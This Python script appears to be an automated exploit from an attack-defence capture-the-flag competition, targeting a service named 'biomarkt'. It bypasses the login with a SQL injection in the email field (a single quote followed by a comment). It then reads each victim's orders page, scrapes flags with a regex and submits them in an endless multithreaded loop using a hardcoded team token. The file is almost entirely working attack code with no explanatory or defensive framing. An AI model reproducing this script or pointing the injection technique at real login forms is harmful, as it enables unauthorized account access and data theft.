#/usr/bin/python3

import requests, time, re, _thread

TEAM_TOKEN = 'ddfe3c79ffdb518891f4f82ea90b433f'

chall = "biomarkt"

def split(a, n):
    k, m = divmod(len(a), n)
    return (a[i*k+min(i, m):(i+1)*k+min(i+1, m)] for i in range(n))

MAX_THREADS = 8

lista = []
n_thread = 0

def exploit(json, ips):
	global n_thread
	global lista
	c = 0
	for ip in ips:
		c += 1
		size = len(json[chall]) // MAX_THREADS
		print(f"{c} / {size} ...")
		for username in json[chall][ip]:
			try:
				flag = get(ip, username)
				print(flag)
			except:
				print("ERR")
				continue
			if flag not in lista:
				lista.append(flag)
	n_thread += 1
			
	
def get(ip, username):
	session = requests.Session()
	burp0_url = f"http://{ip}:18080/login"
	
	burp0_data = {"email": username+"' -- ", "password": "a"}
	resp1 = session.post(burp0_url, data=burp0_data)
	uid = resp1.text.split("orders?uid=")[1].split('">')[0]
	resp2 = session.get(f"http://{ip}:18080/orders?uid={uid}")
	
	flag = re.findall("[A-Z0-9]{31}=", resp2.text)[0]
	return flag
	


# TEST
# username = "rLLxSL@mail.com"
# flag = get("10.60.85.1", username)
# print(flag)



#OK
while True:
	print("Running exploit...")
	j = requests.get("http://10.10.0.1:8081/flagIds").json()
	ips = []
	for ip in j[chall]:
		ips.append(ip)	
	ipsArr = split(ips, MAX_THREADS)
	
	lista = []
	n_thread = 0
	
	for arr in ipsArr:
		_thread.start_new_thread(exploit, (j, arr,))
		
	while True:
		if n_thread == MAX_THREADS:
			break
	
	flags = lista
	print(flags)

	print("Putting flags...")
	r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN},json=flags).text
	print(r)
	print("Exploit ok...\nRepeat...")
	print("\n")

	time.sleep(60)




